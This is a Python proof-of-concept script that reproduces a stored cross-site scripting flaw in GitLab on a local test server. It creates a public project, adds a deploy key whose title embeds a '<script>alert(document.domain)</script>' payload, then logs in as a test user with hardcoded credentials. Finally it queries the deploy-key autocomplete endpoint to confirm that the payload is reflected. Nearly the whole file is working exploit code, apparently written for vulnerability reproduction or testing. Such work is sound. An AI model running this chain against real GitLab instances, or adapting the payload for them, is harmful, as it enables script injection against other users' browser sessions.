import time
import os
import requests
import random
import string
import json
from bs4 import BeautifulSoup

BASE = "http://localhost:8080"
TOKEN = os.getenv("GITLAB_PRIVATE_TOKEN", "")  # api_token must be created in the UI
USERNAME = "user1"
PASSWORD = "12345678"

proj1 = "xss_cve_project" + str(int(time.time()))

HEADERS = {"Authorization": f"Bearer {TOKEN}"} if TOKEN else {}


def random_str(n=8):  
    # Generate an n-character alphanumeric random string
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n)) 


def request_id(resp):
    return resp.headers.get("X-Request-Id") or resp.headers.get("X-Request-ID")


def log_api_attempt(method, path, resp, capture):
    rid = request_id(resp)
    if capture:
        print(f"{method} {path} -> {resp.status_code} {rid}")
    else:
        print(f"{method} {path} status={resp.status_code} RID: {rid}")


def session_send(session, method, path, capture=True, **kw):
    url = f"{BASE}{path}"
    resp = session.request(method, url, **kw)
    if capture:
        print(f"{method} {path} -> {resp.status_code} X-Request-Id: {request_id(resp)}")
    else:
        print(f"{method} {path} status={resp.status_code} RID: {request_id(resp)}")
    return resp


def csrf_token(html):
    soup = BeautifulSoup(html, "html.parser")
    meta = soup.find("meta", {"name": "csrf-token"})
    if meta and meta.get("content"):
        return meta["content"]
    inp = soup.find("input", {"name": "authenticity_token"})
    if inp and inp.get("value"):
        return inp["value"]
    return None


def create_project(name, path):
    api_path = "/api/v4/projects"
    for attempt in range(12):
        project_name = name if attempt == 0 else f"{name}_{random_str(4)}"
        project_path = path if attempt == 0 else f"{path}_{random_str(4)}"
        session = requests.Session()
        session.trust_env = False
        resp = session.post(
            f"{BASE}{api_path}",
            headers=HEADERS,
            json={"name": project_name, "path": project_path, "visibility": "public"},
        )
        ok = resp.ok and request_id(resp)
        log_api_attempt("POST", api_path, resp, capture=ok)
        if ok:
            print(f"Project created: {project_name}")
            payload = resp.json()
            return int(payload.get("id")), payload.get("path_with_namespace") or project_path
        time.sleep(5)
    raise RuntimeError("project creation did not produce a successful request id")
    

def create_project_deploykey(project_id):
    api_path = f"/api/v4/projects/{project_id}/deploy_keys"
    for _ in range(12):
        rsa_key = f"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkhkyrQJvb30Q5lLZzxeALqCyBrLOh+QzRYWh+gPGpqi2efyGMf5beN2zda66OI6DaclB31SJ0jYzaYKgKXQw7rzu/IYazONdy5lz5O2iUB2BkDzJYZ+BObTaTCjyDgSvNNuezUqNXXqoXftEMa1l0+FRSkTusH5F2P3JCV3Tf1BBQImrbDIpdc6ps+UxsiX7S/dT+7bNIVXblC8s8k+AK4CWsC2KmfMToK35pk+sa9JI+rb26hzv8IHA8n7cqXOmR5qAj2qX962p1kOLNXCyHJAKAIfRXCuDPbXiB+kjnu478eIcudOPveo3CK3G6hBI0hPSRfoyAUIubcdd{random_str(4)}R"
        title = f"test{random_str(4)} <script>alert(document.domain)</script>"
        session = requests.Session()
        session.trust_env = False
        resp = session.post(
            f"{BASE}{api_path}",
            headers=HEADERS,
            json={"title": title, "key": rsa_key, "can_push": "true"},
        )
        ok = resp.ok and request_id(resp)
        log_api_attempt("POST", api_path, resp, capture=ok)
        if ok:
            return title
        time.sleep(5)
    raise RuntimeError("deploy key creation did not produce a successful request id")


def login_user():
    session = requests.Session()
    session.trust_env = False
    r = session_send(session, "GET", "/users/sign_in", capture=False, allow_redirects=True)
    token = csrf_token(r.text)
    if not token:
        raise RuntimeError("failed to extract GitLab login CSRF token")

    data = {
        "authenticity_token": token,
        "user[login]": USERNAME,
        "user[password]": PASSWORD,
        "user[remember_me]": "0",
    }
    r = session_send(session, "POST", "/users/sign_in", capture=False, data=data, allow_redirects=False)
    if r.status_code not in (302, 303):
        raise RuntimeError(f"login failed: {r.status_code}")
    return session


def trigger_deploy_key_autocomplete(session, project_id, project_path, payload_title):
    settings_path = f"/{project_path}/-/settings/repository"
    for _ in range(12):
        settings = session_send(session, "GET", settings_path, capture=False, allow_redirects=True)
        if settings.status_code < 500:
            break
        time.sleep(5)
    else:
        raise RuntimeError("repository settings page stayed unavailable")

    path = (
        "/-/autocomplete/deploy_keys_with_owners.json"
        f"?search=&per_page=20&active=true&project_id={project_id}&push_code=true"
    )
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Referer": f"{BASE}{settings_path}",
        "X-Requested-With": "XMLHttpRequest",
    }
    for _ in range(12):
        warmup = session_send(session, "GET", path, capture=False, headers=headers, allow_redirects=False)
        if warmup.status_code < 500:
            break
        time.sleep(5)
    else:
        raise RuntimeError("deploy key autocomplete stayed unavailable")

    alert_payload_present = False
    try:
        alert_payload_present = any(item.get("title") == payload_title for item in warmup.json())
    except json.JSONDecodeError:
        alert_payload_present = payload_title in warmup.text
    print(f"Alert payload present in autocomplete response: {alert_payload_present}")

    etag = warmup.headers.get("ETag")
    if etag:
        headers = {**headers, "If-None-Match": etag}
    trigger = session_send(session, "GET", path, headers=headers, allow_redirects=False)
    if trigger.status_code >= 500 or not request_id(trigger):
        raise RuntimeError("trigger request did not return X-Request-Id")
    return trigger


if __name__ == "__main__":
    project = create_project(proj1, proj1)
    project_id, project_path = project
    payload_title = create_project_deploykey(project_id)
    user_session = login_user()
    trigger_deploy_key_autocomplete(user_session, project_id, project_path, payload_title)
